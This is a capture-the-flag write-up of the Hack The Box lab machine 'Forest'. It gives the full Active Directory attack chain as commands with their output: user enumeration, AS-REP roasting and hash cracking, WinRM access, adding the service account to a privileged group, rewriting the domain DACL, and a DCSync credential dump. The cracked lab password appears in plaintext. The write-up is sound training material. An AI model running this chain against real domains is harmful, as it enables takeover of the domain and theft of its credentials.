| **Machine**             | \[Forest]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Easy                                                                                                                           |
| **Key Concepts**        | `Active Directory, AS-REP Roasting, BloodHound, DCSync` |

We run nmap and see a bunch of open ports typical for a domain controller:
```bash
└─$ cat nmap_long        
# Nmap 7.95 scan initiated Wed Aug  6 05:19:24 2025 as: /usr/lib/nmap/nmap -sCV -p- --min-rate=1000 -oN nmap_long 10.129.162.127
Warning: 10.129.162.127 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.162.127                                                                                                    
Host is up (0.068s latency).
Not shown: 65467 closed tcp ports (reset), 44 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-06 09:27:52Z)
135/tcp   open  msrpc        Microsoft Windows RPC                                                                                     
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?                         
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped                        
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped                                      
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                           
|_http-server-header: Microsoft-HTTPAPI/2.0       
9389/tcp  open  mc-nmf       .NET Message Framing 
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC              
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0                                                                       
49677/tcp open  msrpc        Microsoft Windows RPC
49682/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
55813/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb2-time: 
|   date: 2025-08-06T09:28:44             
|_  start_date: 2025-08-06T09:03:53
|_clock-skew: mean: 2h26m52s, deviation: 4h02m31s, median: 6m51s
| smb-os-discovery:           
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST    
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local                                                                                                             
|   Forest name: htb.local                                                                                                             
|   FQDN: FOREST.htb.local
|_  System time: 2025-08-06T02:28:45-07:00  
| smb2-security-mode: 


```

Some key services:

    389 / 3268 LDAP

    88 Kerberos

    445 SMB

    5985 WinRM

    Domain: htb.local

    Hostname: FOREST

I add the domain to /etc/hosts:

```bash
─$ echo "10.129.162.127 htb.local" | sudo tee -a /etc/hosts                                  
[sudo] password for kali: 
10.129.162.127 htb.local

```

Tried SMB enumeration with guest, account is disabled.

```bash
└─$ nxc smb 10.129.162.127 -u 'guest' -p ''
SMB         10.129.162.127  445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.162.127  445    FOREST           [-] htb.local\guest: STATUS_ACCOUNT_DISABLED 

```

Tested other random creds too same result, sometimes if the guests account is disabled we still can enumerate with non existing users.

Used enum4linux-ng and found FQDN and a domain usernames

```bash
└─$ enum4linux-ng 10.129.162.127                                                                                                                                                                                                                                              
ENUM4LINUX - next generation (v1.3.4)                                                                                                                                                              
 ==========================                                                                                                                                                                                                                                                   
|    Target Information    |                                                                                                                                                                                                                                                  
 ==========================                                                                                                                                                                                                                                                   
[*] Target ........... 10.129.162.127                                                                                                                                                                                                                                         
[*] Username ......... ''                                                                                                                                                                                                                                                     
[*] Random Username .. 'crkfgxdq'                                                                                                                                                                                                                                             
[*] Password ......... ''                                                                                                                                                                                                                                                     
[*] Timeout .......... 5 second(s)      
...................................
DNS domain: htb.local                                                                                     
FQDN: FOREST.htb.local    

```

<img width="1677" height="1509" alt="2025-08-06 135359" src="https://github.com/user-attachments/assets/6eccbcb8-7feb-4e8f-8a34-5749089b4629" />


I cleaned the output to get just usernames:

```bash─$ enum4linux-ng 10.129.162.127 | grep "username" | grep -v "SM\|Health"| cut -d ":" -f 2
[+] Server allows session using username '', password ''
 sebastien
 lucinda
 svc-alfresco
 andy
 mark
 santi
 Administrator
 Guest
 krbtgt
 DefaultAccount
```

## Foothold

Since we don`t have anymore information, let’s test if any users have the same password as their username:
```bash
└─$ nxc smb 10.129.162.127 -u users -p users --continue-on-success -k
SMB         10.129.162.127  445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.162.127  445    FOREST           [-] htb.local\sebastien:sebastien KDC_ERR_PREAUTH_FAILED 
SMB         10.129.162.127  445    FOREST           [-] htb.local\lucinda:sebastien KDC_ERR_PREAUTH_FAILED 
SMB         10.129.162.127  445    FOREST           [+] htb.local\svc-alfresco account vulnerable to asreproast attack

```
netexec tells us that svc-alfresco is vulnerable to asreproast attack.
> AS-REP Roasting targets **Kerberos user accounts** that **do not require pre-authentication**.

I perfom the attack and dump the hash using impacket-getNPUsers:

<img width="3786" height="186" alt="2025-08-06 140440" src="https://github.com/user-attachments/assets/ec0115b5-18d2-4973-bc2c-f6de7da777e8" />


And crack the hash with hashcat.

<img width="3819" height="1131" alt="2025-08-06 140705" src="https://github.com/user-attachments/assets/c018b691-7c37-4d17-8692-584973a947f6" />

Now that we have valid credentials, lets enumerate SMB again:

```bash
└─$ nxc smb 10.129.162.127 -u svc-alfresco -p <REDACTED> --shares
SMB         10.129.162.127  445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.162.127  445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.129.162.127  445    FOREST           [*] Enumerated shares
SMB         10.129.162.127  445    FOREST           Share           Permissions     Remark
SMB         10.129.162.127  445    FOREST           -----           -----------     ------
SMB         10.129.162.127  445    FOREST           ADMIN$                          Remote Admin
SMB         10.129.162.127  445    FOREST           C$                              Default share
SMB         10.129.162.127  445    FOREST           IPC$            READ            Remote IPC
SMB         10.129.162.127  445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.129.162.127  445    FOREST           SYSVOL          READ            Logon server share 

```

Only default windows shares, nothing useful.

We saw port 5985 (WinRM) is open on our nmap scan, so I tested WinRM with netexec:

```bash
└─$ nxc winrm 10.129.162.127 -u svc-alfresco -p <REDACTED>   
WINRM       10.129.162.127  5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
WINRM       10.129.162.127  5985   FOREST           [+] htb.local\svc-alfresco:<REDACTED> (Pwn3d!)
```
Works indeed! 

I will authenticate to evil-Winrm and grab the user flag on desktop, first step is done! 

<img width="2255" height="741" alt="2025-08-06 141211" src="https://github.com/user-attachments/assets/9e6c960a-4d2e-49cd-8bfa-47520b1db9a3" />


# Privilege Escalation

Lets enumerate with `whoami /all` what groups and privileges we have.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

```

The Account Operators, IT Acoounts and Service Accounts are all intersting groups.

Lets ran BloodHound to see where this gets us:

```bash
└─$ bloodhound-python -c ALL --zip -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.162.127
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 11S
INFO: Compressing output into 20250806082113_bloodhound.zip
```

and upload the data to Bloodhound, quering for shortest path to Domain Admins we see the following

<img width="2709" height="1295" alt="2025-08-06 142327" src="https://github.com/user-attachments/assets/3a90ab2d-feee-4641-8304-0417f80081a7" />

## Exploitation Chain

 1. Since we are in the Account Operators group, we have GenericAll privilege over EXCHANGE WINDOWS PERMISSIONS, we will add ourselves to that group.

 2. From EXCHANGE WINDOWS PERMISSIONS, we have permission to modify the DACL (Discretionary Access Control List) on the HTB.LOCAL domain.

 3. From here, we can perform a DC Sync attack.

> DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. This attack can lead to the compromise of major credential material such as the Kerberos krbtgt keys used legitimately for tickets creation, but also for tickets forging by attackers. The consequences of this attack are similar to an NTDS.dit dump and parsing but the practical aspect differ. A DCSync is not a simple copy & parse of the NTDS.dit file, it's a DsGetNCChanges operation transported in an RPC request to the DRSUAPI (Directory Replication Service API) to replicate data (including credentials) from a domain controller.

Step 1: Add our user to Exchange Windows Permissions

```bash
└─$ bloodyAD --host "10.129.162.127" -d "HTB.LOCAL" -u "svc-alfresco" -p "<REDACTED>" add groupMember "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco"
[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS
```

Lets confirm that we are now in that group:

```bash
─$ net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "HTB.LOCAL\svc-alfresco" -S 10.129.162.127                                          
Password for [HTB.LOCAL\svc-alfresco]:
HTB\Exchange Trusted Subsystem
HTB\svc-alfresco
```

Step 2: Modify domain DACL, granting ourself `fullcontrol` rights.
```bash
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' -inheritance "HTB.LOCAL"/"svc-alfresco":"s3rvice"         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250806-084223.bak
[*] DACL modified successfully!
```

Step 3: Perform DCSync attack with secretsdump

<img width="1998" height="1398" alt="2025-08-06 144511" src="https://github.com/user-attachments/assets/29058a7b-2b00-4891-963c-e816c02f05da" />

Nice! Now we can use the dumped NTLM hash to connect as Administrator via WinRM:

<img width="1985" height="312" alt="2025-08-06 144754" src="https://github.com/user-attachments/assets/686144bf-69ed-4ddc-8e4e-2591b65cce05" />

Root flag captured. Box done! 
